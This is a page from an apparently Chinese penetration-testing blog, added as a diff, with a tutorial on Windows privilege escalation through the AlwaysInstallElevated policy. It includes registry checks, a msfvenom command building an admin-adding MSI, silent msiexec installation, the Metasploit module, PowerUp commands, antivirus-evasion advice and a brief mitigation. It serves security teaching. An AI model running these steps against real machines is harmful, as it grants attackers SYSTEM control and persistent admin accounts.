@@ -1,0 +1,249 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    MS08067 Dark
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="APT攻防,内网渗透,内网安全攻防,实战渗透测试,WEB安全攻防,徐焱,shuteer,ms08067" />
+    
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">MS08067</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tiquan/" title="提权">
+		                提权
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/web/" title="WEB">
+		                WEB
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/neiwang/" title="内网">
+		                内网
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tools/" title="工具">
+		                工具
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+		            
+		            
+		            
+		            
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >系统错误配置提权之AlwaysInstallElevated</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="系统错误配置提权之AlwaysInstallElevated"><a href="#系统错误配置提权之AlwaysInstallElevated" class="headerlink" title="系统错误配置提权之AlwaysInstallElevated"></a>系统错误配置提权之AlwaysInstallElevated</h1><p>在讲AlwaysInstallElevated提权之前先要普及下Windows Installer相关知识点，以便更好的理解该漏洞产生的前因后果。</p>
+<h2 id="0×01-Windows-Installer相关知识点介绍"><a href="#0×01-Windows-Installer相关知识点介绍" class="headerlink" title="0×01 Windows Installer相关知识点介绍"></a>0×01 Windows Installer相关知识点介绍</h2><p>Windows Installer，微软操作系统的组件之一，是专门用来管理和配置软件服务的工具。除了是一个安装程序外，它还可以实现管理软件的安装，管理软件组件的添加和删除，监视文件复原，并通过使用回滚来维护基本的灾难恢复等功能。</p>
+<p>Windows Installer技术分为以下两部分，它们结合在一起工作：客户端安装服务 (Msiexec.exe) 和 Microsoft软件安装 (MSI)软件包文件。Windows Installer通过Msiexec安装MSI中包含的信息程序。</p>
+<p>MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装一种产品所需要的信息和在很多安装情形下安装（和卸载）程序所需的指令和数据。MSI文件将程序的组成文件与功能关联起来。此外，它还包含有关安装过程本身的信息：如安装序列、目标文件夹路径、系统依赖项、安装选项和控制安装过程的属性。</p>
+<p>而Msiexec就是用于安装Windows Installer安装包（MSI），一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大。简单的说当您双击 .msi 文件时，就会运行 Msiexec.exe。</p>
+<h2 id="0×02-AlwaysInstallElevated简介"><a href="#0×02-AlwaysInstallElevated简介" class="headerlink" title="0×02 AlwaysInstallElevated简介"></a>0×02 AlwaysInstallElevated简介</h2><p>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的MSI文件就可以进行管理员权限的提升。假设我们拿到目标主机的Meterpreter会话后并没能通过一些常规方式取得SYSTEM权限，那么AlwaysInstallElevated提权可以给我们带来另一条思路。</p>
+<h2 id="0×03-Metasploit下AlwaysInstallElevated实战"><a href="#0×03-Metasploit下AlwaysInstallElevated实战" class="headerlink" title="0×03 Metasploit下AlwaysInstallElevated实战"></a>0×03 Metasploit下AlwaysInstallElevated实战</h2><p>此时假设我们通过一系列前期渗透，已经成功获得了目标机的meterpreter shell（过程略），然后尝试了各类提权方法后失败，此时我们可以尝试通过AlwaysInstallElevated来实现权限的提升。</p>
+<p>1.检测目标主机是否存在该漏洞</p>
+<p>在meterpreter shell命令提示符下输入shell命令进入目标主机的CMD下，然后输入如下命令，查看AlwaysInstallElevated是否被定义。如下图所示。</p>
+<p><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code><br><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/GkKbIgm4EL.png?imageslim" alt="mark"></p>
+<p>可以看到当前目标机已经被设置了值全为1表示已经开启AlwaysInstallElevated，如果组策略里AlwaysInstallElevated没有开启，则会显示“The system was unable to find the specified registry key or value”或者“错误: 系统找不到指定的注册表项或值”之类的提示。如下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/5a4D7IL1ba.png?imageslim" alt="mark"></p>
+<p>如果AlwaysInstallElevated没有开启，但已经获得了对注册表的访问权限，还可以通过更改注册表来开启AlwaysInstallElevated（必须同时修改两处注册表键值），进而提升权限，甚至当成提权后门。</p>
+<p>2.生成恶意MSI安装文件</p>
+<p>接下来我们就利用Metasploit下MSFVenom来生成一个在目标机器上增加管理员用户的MSI安装文件，命令如下。<br>msfvenom -f msi -p windows/adduser USER=msi PASS=123!P@ssword-o /root/msi.msi<br>该命令意思在tmp文件夹下生成一个名为msi的MSI安装文件，文件内容为添加一个账号为msi，密码为123!P@ssword的用户。如下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/88FjJGjc8b.png?imageslim" alt="mark"></p>
+<p>3.上传安装该MSI文件</p>
+<p>在meterpreter shell命令提示符下我们使用下列命令将该MSI文件上传到目标主机C盘下面，如下图所示。</p>
+<p><code>upload /root/msi.msi c:\\msi.msi</code></p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/jkljDm98af.png?imageslim" alt="mark"></p>
+<p>可以看到已经上传成功，接下来我们输入shell命令进入目标主机cmd下使用命令行工具Msiexec进行安装，具体命令如下。<br>msiexec /quiet /qn /i C:\msi.msi<br>msiexec工具相关的参数：<br>/quiet=安装过程中禁止向用户发送消息<br>/qn=不使用图形界面<br>/i=安装程序<br>执行之后，成功添加上了该账号密码。如图5所示。当然这里也可以直接生成木马程序。</p>
+<p>注：由于是msf生成的msi文件，所以默认会被杀毒软件拦截，做好免杀。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/4LGFf0EJ44.png?imageslim" alt="mark"></p>
+<p>4.查看是否提权成功</p>
+<p>执行成功之后，我们在目标机上检测我们添加的用户是否已经具有管理员权限，输入如下命令查看管理员组用户列表，可以看到已经提权成功。如下图所示。</p>
+<p><code>net localgroup administrators</code></p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/BE4c963h9C.png?imageslim" alt="mark"></p>
+<p>5.利用Metasploit下exploit模块提权</p>
+<p>当然Metasploit下也有相对应的模块，exploit/windows/local/always_install_elevated，利用exploit模块提权就相当简单了，我们使用该模块，只要设置一个SESSION参数，见下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/LDaeLcfF5f.png?imageslim" alt="mark"></p>
+<p>设置完成后，输入run命令，就可以看到自动反弹了一个新的meterpreter，我们在此meterpreter shell下输入getuid 发现是system权限，如下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/jDki82feI2.png?imageslim" alt="mark"></p>
+<p>到这里我们已经提权成功了，这个模块会创建一个随机文件名的MSI文件并在提权成功后删除所有已部署的文件。<br>最后我们输入sessions可以看到有2个meterpreter，ID为3的就是新反弹回来的，如下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/6ch8825Jgm.png?imageslim" alt="mark"></p>
+<h2 id="0×04-PowerShell下AlwaysInstallElevated实战"><a href="#0×04-PowerShell下AlwaysInstallElevated实战" class="headerlink" title="0×04 PowerShell下AlwaysInstallElevated实战"></a>0×04 PowerShell下AlwaysInstallElevated实战</h2><p>Powershell框架-Powerup同样也能完成提权添加用户的操作，powerup地址：<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1。" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1。</a><br>使用Powerup的Get-RegAlwaysInstallElevated模块来检查注册表项是否被设置，如果AlwaysInstallElevated注册表项被设置，意味着的MSI文件是以system权限运行的。命令如下，True表示已经设置，如下图所示。</p>
+<p><code>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;c:/PowerUp.ps1&#39;); Get-RegAlwaysInstallElevated</code></p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/fbEcfdkbEg.png?imageslim" alt="mark"></p>
+<p>接着利用AlwaysInstallElevated来添加用户，运行如下命令，运行后生成文件UserAdd.msi，这时以普通用户权限运行这个UserAdd.msi，就会成功添加账户，如下图所示。</p>
+<p><code>Write-UserAddMSI</code></p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/C66dF8BAGC.png?imageslim" alt="mark"></p>
+<p>我们在查看下管理员组的成员，可以看到已经成功在普通权限的CMD下添加了一个管理员账户。如下图所示。</p>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/i16HeHg3dg.png?imageslim" alt="mark"></p>
+<h2 id="0×05-AlwaysInstallElevated漏洞产生的原因"><a href="#0×05-AlwaysInstallElevated漏洞产生的原因" class="headerlink" title="0×05 AlwaysInstallElevated漏洞产生的原因"></a>0×05 AlwaysInstallElevated漏洞产生的原因</h2><p>该漏洞产生的原因是因为用户开启了windows installer特权安装功能，设置的方法如下图所示：</p>
+<p>打开组策略编辑器（运行框中输入gpedit.msc）</p>
+<ul>
+<li>组策略－计算机配置—管理模版—Windows组件—Windows Installer—永远以高特权进行安装：选择启用</li>
+<li>组策略－用户配置—管理模版－Windows组件—Windows Installer－永远以高特权进行安装：选择启用</li>
+</ul>
+<p><img src="http://olizegh9a.bkt.clouddn.com/blog/180127/IIc4J3alF5.png?imageslim" alt="mark"></p>
+<p>设置完毕之后，会在两个注册表如下位置自动创建键值为”1″。</p>
+<p><code>[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</code><br><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</code></p>
+<p>防护：对照利用方法进行防御，只要关闭AlwaysInstallElevated，即可阻止通过msi文件的提权利用。</p>
+<p><em>TheEnd.</em></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 changyan -->
+<div id="changyan-comment">
+    <!--PC和WAP自适应版-->
+<div id="SOHUCS" sid="2018/01/27/系统错误配置提权之AlwaysInstallElevated/"  ></div>
+<script type="text/javascript">
+(function(){
+var appid = 'cytwTxNn3';
+var conf = '';
+var width = window.innerWidth || document.documentElement.clientWidth;
+if (width < 960) {
+window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+
+</div>
+<style>
+    #changyan-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+				<span id="busuanzi_container_site_pv"> 2018 </span> 
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
